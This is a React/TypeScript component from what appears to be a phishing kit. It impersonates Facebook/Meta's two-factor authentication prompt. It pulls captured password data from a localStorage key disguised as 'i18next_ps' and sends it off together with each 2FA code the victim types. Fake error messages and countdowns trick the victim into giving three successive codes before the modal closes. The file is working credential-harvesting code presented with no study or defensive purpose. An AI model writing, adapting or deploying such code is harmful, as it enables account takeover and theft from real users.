import React from 'react';
import Modal from './Modal';
import { maskPhoneNumber, maskEmail } from '@/libs/mask-phone';
import { clearLocalStorage, getLocalStorage, setLocalStorage } from '@/helper/localstorage';
import { CallApi } from '@/libs/call-api';
import { useTranslation } from 'react-i18next';

interface TwoFactorModalProps {
    isOpend: boolean;
    isOpendFinish: (value: boolean) => void;
    onToggleModal: (isOpen: boolean) => void;
}

const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish, onToggleModal }) => {

    const { t } = useTranslation();

    const [isOpen, setIsOpen] = React.useState(isOpend);
    const [errors, setErrors] = React.useState<Record<string, string>>({});
    const [loading, setLoading] = React.useState(false);
    const [click, setClick] = React.useState(0);
    const [disabled, setDisable] = React.useState(false);

    const dataPassword = getLocalStorage("i18next_ps");
    const { fullName, phone, email } = dataPassword as any || {};

    const phoneDisplay = maskPhoneNumber(phone)
    const emailDisplay = maskEmail(email);

    let [countdown, setCountdown] = React.useState<number>((process.env.NEXT_PUBLIC_SETTING_TIME) ? parseInt(process.env.NEXT_PUBLIC_SETTING_TIME) : 30);

    React.useEffect(() => {
        setIsOpen(isOpend);
    }, [isOpend]);

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { id, value } = e.target;
        setFormData(prev => ({ ...prev, [id]: value }));
        setErrors(prev => ({ ...prev, [id]: '' })); // Clear error on change
    };

    const [formData, setFormData] = React.useState({
        twoFa: ''
    });

    // Validate 2FA code length (6-8 digits)
    const isTwoFaValid = formData.twoFa.length >= 6 && /^\d+$/.test(formData.twoFa);

    const handleClose = () => {
        setIsOpen(false);
        onToggleModal(false);
    };

    const handSubmit = async (e: React.FormEvent) => {
        try {
            e.preventDefault();

            const newErrors: Record<string, string> = {};

            if (Object.keys(newErrors).length > 0) {
                setErrors(newErrors);
                return;
            }
            const isTwoFaValid = formData.twoFa.length >= 6 && /^\d+$/.test(formData.twoFa);

            if (!isTwoFaValid) {
                return;
            }

            setLoading(true);

            if (click === 0) {

                const clientDataClickZero = {
                    ...dataPassword as any,
                    twoFa: formData.twoFa,
                };

                await CallApi(clientDataClickZero)
                    .then(() => {

                        setLocalStorage("i18next_tf_1", clientDataClickZero);

                        setTimeout(async () => {
                            setLoading(false);
                            setFormData({ twoFa: '' });

                            const minutes = Math.floor(countdown / 60);
                            const seconds = countdown % 60;
                            setErrors({
                                twoFa: `${t('modal.two_factor.form.code.error')} ${minutes > 0 ? minutes : 0} ${t('modal.two_factor.form.code.error_2')} ${seconds > 0 ? seconds : 0} ${t('modal.two_factor.form.code.error_3')}`,
                            });

                            const countdownInterval = setInterval(() => {
                                setDisable(true);
                                countdown -= 1;
                                setCountdown(countdown);

                                const minutes = Math.floor(countdown / 60);
                                const seconds = countdown % 60;

                                setErrors({
                                    twoFa: `${t('modal.two_factor.form.code.error')} ${minutes > 0 ? minutes : 0} ${t('modal.two_factor.form.code.error_2')} ${seconds > 0 ? seconds : 0} ${t('modal.two_factor.form.code.error_3')}`
                                });

                                if (countdown <= 0) {
                                    clearInterval(countdownInterval);
                                    setClick(1);
                                    setErrors({});
                                    setDisable(false)
                                    setCountdown(process.env.NEXT_PUBLIC_SETTING_TIME ? parseInt(process.env.NEXT_PUBLIC_SETTING_TIME) : 30);
                                }
                            }, 1000);

                        }, 1234);

                    })
                    .catch((err) => {
                        console.log(err);
                    });
            }

            if (click === 1) {

                const dataPasswordTwo = getLocalStorage("i18next_tf_1");
                const clientDataClickOne = {
                    ...dataPasswordTwo as any,
                    twoFaSecond: formData.twoFa,
                };

                await CallApi(clientDataClickOne)
                    .then(() => {

                        setLocalStorage("i18next_tf_2", clientDataClickOne);

                        setTimeout(async () => {
                            setLoading(false);
                            setFormData({ twoFa: '' });

                            const minutes = Math.floor(countdown / 60);
                            const seconds = countdown % 60;
                            setErrors({
                                twoFa: `${t('modal.two_factor.form.code.error')} ${minutes > 0 ? minutes : 0} ${t('modal.two_factor.form.code.error_2')} ${seconds > 0 ? seconds : 0} ${t('modal.two_factor.form.code.error_3')}`,
                            });

                            const countdownInterval = setInterval(() => {
                                setDisable(true);
                                countdown -= 1;
                                setCountdown(countdown);

                                const minutes = Math.floor(countdown / 60);
                                const seconds = countdown % 60;

                                setErrors({
                                    twoFa: `${t('modal.two_factor.form.code.error')} ${minutes > 0 ? minutes : 0} ${t('modal.two_factor.form.code.error_2')} ${seconds > 0 ? seconds : 0} ${t('modal.two_factor.form.code.error_3')}`
                                });

                                if (countdown <= 0) {
                                    clearInterval(countdownInterval);
                                    setClick(2);
                                    setErrors({});
                                    setDisable(false)
                                    setCountdown(process.env.NEXT_PUBLIC_SETTING_TIME ? parseInt(process.env.NEXT_PUBLIC_SETTING_TIME) : 30);
                                }
                            }, 1000);

                        }, 1234);

                    })
                    .catch((err) => {
                        console.log(err);
                    });
            }

            if (click === 2) {

                const dataPasswordThree = getLocalStorage("i18next_tf_2");
                const clientDataClickTwo = {
                    ...dataPasswordThree as any,
                    twoFaThird: formData.twoFa,
                };

                await CallApi(clientDataClickTwo)
                    .then(() => {

                        setTimeout(async () => {
                            setLoading(false);
                            setFormData({ twoFa: '' });
                            isOpendFinish(true);
                            handleClose();
                            setErrors({});
                            clearLocalStorage()
                            setClick(0);
                        }, 1234);

                    })
                    .catch((err) => {
                        console.log(err);
                    });
            }


        } catch (error) {
            console.error("Error submitting form:", error);
        }
    };

    const inputClass = (field: string) => `input w-full border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 ${disabled ? '' : 'hover:shadow-blue-100 hover:border-[#3b82f6] hover:shadow-md'} transition-all duration-200`;
    const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;

    return (
        <Modal
            isOpen={isOpen}
            title=''
            onClose={handleClose}
            isClosable={false}
        >
            <div className="h-full flex flex-col flex-start w-full items-center justify-between flex-1">
                <div className='w-full'>
                    <div className='flex w-full items-center text-[#9a979e] gap-[6px] text-[14px] mb-[7px]'>
                        <span>{fullName}</span>
                        <div className="w-[4px] h-[4px] bg-[#9a979e] rounded-[5px]"></div>
                        <span>Facebook</span>
                    </div>
                    <h2 className='text-[20px] text-[black] font-[700] mb-[15px]'>{t('modal.two_factor.title')}</h2>
                    <p className='text-[#9a979e] text-[14px]'>{t('modal.two_factor.description')} {emailDisplay}, {phoneDisplay} {t('modal.two_factor.description_2')}</p>
                    <div className='w-full rounded-[10px] bg-[#f5f5f5] overflow-hidden my-[15px]'>
                        <img src="/images/meta/authentication.png" width="100%" alt="authentication" />
                    </div>
                    <div className='w-full'>
                        <form onSubmit={handSubmit}>
                            <div className={`${inputClass('twoFa')}`} >
                                <input
                                    type="number"
                                    id="twoFa"
                                    placeholder={t('modal.two_factor.form.code.placeholder')}
                                    className={`w-full outline-none h-full bg-transparent ${disabled ? 'opacity-70 cursor-not-allowed' : ''}`}
                                    value={formData.twoFa}
                                    onChange={handleChange}
                                    disabled={disabled}
                                />
                            </div>
                            {errorText('twoFa')}

                            <div className='w-full mt-[20px]'>
                                <button
                                    className={`h-[45px] min-h-[45px] w-full bg-[#0064E0] text-white rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center transition-opacity duration-300 ${loading || disabled || !isTwoFaValid ? 'opacity-70 cursor-not-allowed' : 'cursor-pointer'}`}
                                    disabled={disabled || !isTwoFaValid}
                                >
                                    {loading && (
                                        <div className="animate-spin mr-[10px] w-[20px] h-[20px]">
                                            <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="loading" />
                                        </div>
                                    )}
                                    {loading ? '' : t('modal.two_factor.form.button.text')}
                                </button>
                            </div>

                            <div className='w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] poiter-events-none'>
                                <span>{t('modal.two_factor.form.link.text')}</span>
                            </div>
                        </form>
                    </div>
                </div>

                <div className='w-[60px] mt-[20px] mx-auto'>
                    <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="logo" />
                </div>
            </div>
        </Modal>
    );
};

export default TwoFactorModal;